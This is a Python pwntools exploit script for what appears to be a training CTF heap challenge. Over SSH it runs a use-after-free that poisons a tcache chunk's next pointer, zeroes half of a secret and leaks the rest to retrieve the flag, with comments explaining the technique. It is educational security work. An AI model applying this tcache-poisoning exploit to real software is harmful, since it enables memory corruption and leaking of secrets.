#!/usr/bin/env python

from pwn import *

get_flag = True
chall_name = '8.0'

context.arch = "amd64"

def run_with_gdb(p):
    gdb.attach(p,'''
    b *main
    b *main+1628''')
    run_exploit(p, False)

def run_commands_list(commands, p, print_command):
    for command in commands:
        if print_command and not get_flag:
            print('COMMAND: ', command)
            input("")
        print_send_print(command, p)

def print_send_print(line_to_send, p):
    try:
        p.sendline(line_to_send)
        if get_flag:
            print(p.recvrepeat(1).decode())
        else:
            print(p.recvrepeat(0.2).decode())
    except:
        print('Exception in \'print_send_print\'')
        pass

def get_address(output):
    address_start = output.find('0x')
    address_ends = output.find('.', address_start)
    address = output[address_start:address_ends]
    print('Address found: ', address)
    return int(address, 16)
    #return int('0x422875', 16)

def get_secret_from_output(output):
    print(output)
    start_search_string = 'Data: '
    secret_start = output.find(start_search_string) + len(start_search_string)
    secret_ends = output.find('\n', secret_start)
    return output[secret_start:secret_ends]

def run_exploit(p, debug):
    if debug:
        run_with_gdb(p)
        
    # the secret address uses 'whitespace-armoring' (he has white space characters). So, passing
    # the secret address directly to scanf don't work (scanf will stop reading when finds the white space character).
    # To solve this issue, we first get the address 8 bytes before the secret (this address will not have white space characters)
    # and use this address to overwrite the 'NEXT' value of a chunk. Why? The secret has 16 bytes in size, so when we malloc this
    # corrupted chunk poiting to secret_address-0x8, the first 8 bytes of the secret will be nulled out because he will be
    # located at the 'KEY' part of the chunk (https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#2952):
    #
    #+====================+========================+==============+============================+============================+
    #| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
    #+---------------------+---------------------+------------------------------+---------------------+---------------------+
    #| 0x42a102            | 0                   | 0 (NONE)                     | (nil)               | 0x6f72737262787076  |
    #+----------------------------------------------------------------------------------------------------------------------+
    #
    # with the first 8 bytes now with the value of '\x00', we can use the secret_address+0x8 to leak the last 8 bytes of
    # the secret because secret_address+0x8 don't have those white space characters. We leak the value using the old use after
    # free with scanf to corrupt a free chunk and point to secret_address+0x8. After that, we malloc to get this corrupted
    # chunk and can use puts to print the last 8 bytes of the secret.
    # The final secret will be \x00\x00\x00\x00\x00\x00\x00\x00+last_8_bytes_secret.

    welcome_message = p.recvrepeat(1).decode()
    print(welcome_message)
    secret_leaked_address = get_address(welcome_message) # getting the secret address
    print(hex(secret_leaked_address))
    secret_address_8_before = p64(secret_leaked_address - 0x8) # getting the address 8 bytes before secret

    # first stage, nulling out the first 8 bytes of secret
    commands = [
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                b'scanf 0 ' + secret_address_8_before + b'ZZZZZZZZ' + b'BBBBBBBB',
                b'malloc 0 100', # getting the first chunk, not useful
                # this second malloc will get our corrupted chunk poiting to secret_address-0x8 and tcache will nullout the first
                # half of the secret
                b'malloc 0 100' 
                ]

    run_commands_list(commands, p, True)

    # leaking the second part of secret
    secret_address_second_half = p64(secret_leaked_address + 0x8) # getting the address 8 bytes after secret
    commands = [
                b'malloc 0 100',
                b'malloc 1 100',
                b'free 1',
                b'free 0',
                b'scanf 0 ' + secret_address_second_half + b'ZZZZZZZZ' + b'BBBBBBBB',
                b'malloc 0 100', 
                b'malloc 0 100'
                ]

    run_commands_list(commands, p, True)
    p.sendline('puts 0') # priting the last 8 bytes of secret
    leaked_secret_output = p.recvrepeat(1).decode()
    print(leaked_secret_output)
    secret = get_secret_from_output(leaked_secret_output)

    p.sendline('send_flag')
    p.sendline('\x00\x00\x00\x00\x00\x00\x00\x00' + secret)
    print(p.recvrepeat(1).decode())
    p.sendline('quit')

    p.close()

if get_flag:
    ssh_connection = ssh(host='college',user='hacker')
    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)
    run_exploit(p, False)
    ssh_connection.close()
else:
    p = process('./' + chall_name)
    run_exploit(p, False)
